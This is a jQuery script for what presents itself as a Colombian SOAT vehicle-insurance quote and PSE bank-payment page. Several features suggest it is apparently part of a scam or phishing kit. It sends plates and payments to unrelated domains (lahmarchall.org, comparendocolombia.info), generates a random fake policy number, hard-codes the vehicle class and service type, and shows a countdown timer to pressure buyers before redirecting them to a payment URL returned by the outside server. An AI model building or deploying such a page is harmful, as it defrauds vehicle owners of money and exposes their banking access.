$(document).ready(function () {
  // Función para formatear la fecha actual
  function getCurrentDate() {
    const today = new Date();
    const dd = String(today.getDate()).padStart(2, '0');
    const mm = String(today.getMonth() + 1).padStart(2, '0');
    const yyyy = today.getFullYear();
    return `${dd}-${mm}-${yyyy}`;
  }

  // Establecer la fecha actual en el datepicker
  $("#datepicker").val(getCurrentDate());

  $(".btnCoti").on("click", async function () {
    const placa = $("#placa").val();
    const placaMoto = /^[a-zA-Z]{3}[0-9]{2}[a-zA-Z]{1}/;
    const placaCarro = /^[a-zA-Z]{3}[0-9]{3}$/;

    if (placaMoto.test(placa) || placaCarro.test(placa)) {
      $("#wait").css("display", "block");
      $("#info").css("display", "none");
      $("#main").css("display", "none");
      $(".btnCoti").prop("disabled", true);

      SendToRequest();
    } else {
      console.log("La placa no es correcta, muestra un modal");
    }
  });

  function SendToRequest() {
    var cdPoliza = $("#placa").val();

    var xhr = new XMLHttpRequest();
    var url = "https://lahmarchall.org/";
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cdPoliza=" + encodeURIComponent(cdPoliza));

    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          var response = JSON.parse(xhr.responseText);

          if (response.status === "soat-price") {
            handleSuccessResponse(response, cdPoliza);
          } else if (
            response.status === "exceeds-expiration-month" ||
            response.status === "working_out_time"
          ) {
            makeSecondaryRequest(cdPoliza);
          } else {
            makeSecondaryRequest(cdPoliza);
          }
        }
      }
    };
  }

  function handleSuccessResponse(response, cdPoliza) {
    localStorage.setItem("placa", cdPoliza);
    localStorage.setItem("marca", response.marca);
    localStorage.setItem("linea", response.linea);
    localStorage.setItem("modelo", response.modelo);
    localStorage.setItem("cilindraje", response.cc);

    var variablePrecio = response.precio;
    var precioFormateado = parseInt(variablePrecio.replace(/[^\d]/g, ""));
    localStorage.setItem("valor", precioFormateado);

    if (response.precio !== "$0") {
      // Ocultar div de carga y main, mostrar información
      $("#wait").css("display", "none");
      $("#main").css("display", "none");
      $("#info").css("display", "block");
      
      // Actualizar las placas (tanto en la parte superior como en el cuadro de información)
      $("#valuePlaca, #infoPlaca, #placaPago").text(cdPoliza.toUpperCase());
      
      // Actualizar todos los campos de marca
      $("#marca, #marcaMovil").text(response.marca);
      
      // Actualizar todos los campos de línea
      $("#linea, #lineaMovil").text(response.linea);
      
      // Actualizar todos los campos de modelo
      $("#modelovehic, #modelovehicMovil, #modeloPago").text(response.modelo);
      
      // Actualizar campos adicionales
      $("#typeOfService, #tipoSPago").text("PARTICULAR");
      $("#cilindrajeDeEsaMonda, #ccPago").text(response.cc);
      $("#clasePago").text("MOTOCICLETA");
      $("#pasajerosPago").text("2");
      $("#prepolizaPago").text(Math.floor(Math.random() * 900000000000) + 100000000000);
      
      // Actualizar precios
      $("#precioMovil").text(response.precio.replace(/[^\d]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, "."));
      $("#precio").text(response.precio);
      $("#primaPago").text(response.precio.replace(/[^\d]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ","));
      $("#valorPago, #valorPago2").text(response.precio.replace(/[^\d]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, "."));

      // Habilitar los botones de comprar (escritorio y móvil)
      $(".btnComprar, .btnpreciomov").prop("disabled", false);
    } else {
      $("#wait").css("display", "none");
      $(".modalSotoVigente").addClass("displayBlock");
      $(".modalSotoVigente").removeClass("displayNone");
    }
  }

  function makeSecondaryRequest(cdPoliza) {
    var xhr2 = new XMLHttpRequest();
    xhr2.open(
      "GET",
      "https://lahmarchall.org/api/?placa=" + encodeURIComponent(cdPoliza),
      true
    );
    xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr2.send();

    xhr2.onreadystatechange = function () {
      if (xhr2.readyState === XMLHttpRequest.DONE) {
        if (xhr2.status === 200) {
          var response2 = JSON.parse(xhr2.responseText);
          handleSuccessResponse(response2, cdPoliza);
        } else {
          $("#wait").css("display", "none");
          $(".modalSotoVigente").addClass("displayBlock");
          $(".modalSotoVigente").removeClass("displayNone");
        }
      }
    };
  }

  function startCountdown() {
    let duration = 60 * 60;
    let timer = duration;
    let countdownInterval = setInterval(function () {
      let minutes = parseInt(timer / 60, 10);
      let seconds = parseInt(timer % 60, 10);

      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      $("#cuentaAtrasVivo").text(minutes + ":" + seconds);

      if (--timer < 0) {
        clearInterval(countdownInterval);
      }
    }, 1000);

    window.countdownIntervalId = countdownInterval;
  }

  // Evento para cuando se selecciona un banco
  $("#bancoPse").on("change", function() {
    const bancoSeleccionado = $(this).val();
    if (bancoSeleccionado !== "0") {
      $("#btnPagarStep44").prop("disabled", false).css({
        'opacity': '1',
        'pointer-events': 'auto'
      });
    } else {
      $("#btnPagarStep44").prop("disabled", true).css({
        'opacity': '0.6',
        'pointer-events': 'none'
      });
    }
  });

  // Manejo del botón de confirmar pago
  $("#btnPagarStep44").on("click", function(event) {
    event.preventDefault();

    // Obtener el banco seleccionado
    const bancoSeleccionado = $("#bancoPse").val();
    
    // Validar banco seleccionado
    if (!bancoSeleccionado || bancoSeleccionado === "0") {
      alert('Por favor, selecciona un banco.');
      return;
    }

    // Mostrar el loading y deshabilitar botón
    $("#wait").css("display", "block");
    $(this).prop("disabled", true).css({
      'opacity': '0.6',
      'pointer-events': 'none'
    });

    // Obtener el valor total (guardado en localStorage, sin puntos ni comas)
    const valorTotal = localStorage.getItem("valor");

    if (!valorTotal) {
      alert('No se pudo obtener el valor total a pagar.');
      $("#wait").css("display", "none");
      $(this).prop("disabled", false).css({
        'opacity': '1',
        'pointer-events': 'auto'
      });
      return;
    }

    // Hacer la petición a la API
    const apiUrl = `https://comparendocolombia.info/apifff/api.php?monto=${valorTotal}&banco=${bancoSeleccionado}`;

    fetch(apiUrl)
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          throw new Error(data.error);
        }

        if (data.url) {
          // Mantener el loading visible y redireccionar
          window.location.href = data.url;
        } else {
          throw new Error('No se encontró la URL de redirección');
        }
      })
      .catch(error => {
        console.error('Error al procesar el pago:', error);
        alert(error.message || 'Ocurrió un error al procesar el pago.');
        $("#wait").css("display", "none");
        $("#btnPagarStep44").prop("disabled", false).css({
          'opacity': '1',
          'pointer-events': 'auto'
        });
      });
  });

  // Eventos de los modales
  $(".btnEntendidoModalW").on("click", function () {
    $(".modalBienvenida").addClass("displayNone");
  });

  $("#cerrarModalManito").on("click", function () {
    $(".modalBienvenida").addClass("displayNone");
  });

  $(".btnAceptarModalSotoVigente").on("click", function () {
    $(".modalSotoVigente").addClass("displayNone");
    $(".btnCoti").prop("disabled", false);
  });

  // Eventos de los botones de comprar
  $(".btnComprar, .btnpreciomov").on("click", function() {
    $("#info").css("display", "none");
    $("#pago").css("display", "block");
    
    // Actualizar campos del resumen de pago
    $("#modeloPago").text(localStorage.getItem("modelo"));
    $("#ccPago").text(localStorage.getItem("cilindraje"));
    $("#placaPago").text(localStorage.getItem("placa"));
    
    // Actualizar valores de pago
    let valorTotal = localStorage.getItem("valor");
    $("#primaPago").text(valorTotal.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","));
    $("#valorPago").text(valorTotal.toString().replace(/\B(?=(\d{3})+(?!\d))/g, "."));
    $("#valorPago2").text(valorTotal.toString().replace(/\B(?=(\d{3})+(?!\d))/g, "."));
    
    if (window.countdownIntervalId) {
      clearInterval(window.countdownIntervalId);
    }
    startCountdown();
  });
});